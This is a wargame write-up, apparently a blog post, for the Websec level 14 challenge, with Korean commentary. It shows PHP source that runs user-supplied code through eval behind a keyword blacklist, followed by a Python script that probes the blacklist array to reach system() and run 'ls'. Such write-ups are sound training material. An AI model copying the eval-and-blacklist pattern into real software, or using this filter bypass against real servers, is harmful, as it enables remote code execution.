---
title: Websec - Level 14
categories: [Wargame, Websec]
tags: [Websec Level 22]
---

## Websec 14
<hr style="border-top: 1px solid;"><br>

![image](https://user-images.githubusercontent.com/52172169/155829404-ae6661d5-a599-424e-b9cc-b7fbef8147c1.png)

<br>

```php
<?php 
ini_set('display_errors', 'on');
ini_set('error_reporting', E_ALL ^ E_DEPRECATED);

if (isset ($_POST['code']) && is_string ($_POST['code'])) {
    $code = substr ($_POST['code'], 0, 25);
} else {
    $code = "print('I hate PHP');";
}
?>
```

<br>

```<!-- If I had to guess, I would say that the $flag is in sha1($flag). -->```

<br>

```php
<?php

$funcs_internal = get_defined_functions()['internal'];

/* lets allow some secure funcs here */
unset ($funcs_internal[array_search('strlen', $funcs_internal)]);
unset ($funcs_internal[array_search('print', $funcs_internal)]);
unset ($funcs_internal[array_search('strcmp', $funcs_internal)]);
unset ($funcs_internal[array_search('strncmp', $funcs_internal)]);

$funcs_extra = array ('eval', 'include', 'require', 'function');
$funny_chars = array ('\.', '\+', '-', '\*', '"', '`', '\[', '\]');
$variables = array ('_GET', '_POST', '_COOKIE', '_REQUEST', '_SERVER', '_FILES', '_ENV', 'HTTP_ENV_VARS', '_SESSION', 'GLOBALS');

$blacklist = array_merge($funcs_internal, $funcs_extra, $funny_chars, $variables);

$insecure = false;
foreach ($blacklist as $blacklisted) {
    if (preg_match ('/' . $blacklisted . '/im', $code)) {
        $insecure = true;
        break;
    }
}

if ($insecure) {
    echo 'Insecure code detected!';
} else {
    eval ($code);
}

?>
```

<br><br>
<hr style="border: 2px solid;">
<br><br>

## Solution
<hr style="border-top: 1px solid;"><br>

```python
import requests

url = 'https://websec.fr/level14/index.php';
headers={'Content-Type':'application/x-www-form-urlencoded'}
cookies={'session':'[redacted]'}

for i in range(0,1000):
	  payload={'code':'echo $blacklist{'+str(i)+'};'}
	  res=requests.post(url, headers=headers, cookies=cookies, data=payload)
	  if "system" in res.text:
		    print(i)
		    break
```

<br>

system 함수를 찾아서 우선 ```system('ls')```를 해보았다.

<br><br>
<hr style="border: 2px solid;">
<br><br>
